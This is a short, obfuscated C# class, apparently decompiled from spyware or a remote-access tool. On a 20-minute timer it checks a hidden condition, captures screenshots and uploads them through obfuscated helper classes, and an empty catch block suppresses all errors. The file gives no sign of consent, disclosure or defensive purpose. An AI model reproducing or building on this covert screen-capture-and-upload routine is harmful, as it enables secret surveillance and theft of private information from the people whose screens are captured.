using System;
using System.Timers;
using JSW1fecBOy;
using UHyll;

namespace Ch9qVeSrN4
{
	public class SetCaptureScreenTimer
	{
		public bool TimerVisible { get; private set; }

		public SetCaptureScreenTimer()
		{
			this.dzzlPn = 20;
			this.Timer.Elapsed += this.StartCaptureScreenInit;
			this.Timer.Interval = (double)(this.dzzlPn * 60000);
		}

		public void StartCaptureScreen()
		{
			Timer.Enabled = true;
			Timer.Start();
			TimerVisible = true;
		}

		public void nkdM6hLyyJ()
		{
			this.Timer.Enabled = false;
			this.Timer.Stop();
			this.TimerVisible = false;
		}

		private void StartCaptureScreenInit(object sender, ElapsedEventArgs e)
		{
			try
			{
				if (!KF4Zzmkr.F4MDOTm5y(60000 * this.dzzlPn))
					return;

				lnY86oB.UploadCaptureScreen(rX3O9y1.CaptureScreenShots());
			}
			catch
			{
			}
		}

		private readonly Timer Timer = new Timer();
		private readonly int dzzlPn;
	}
}
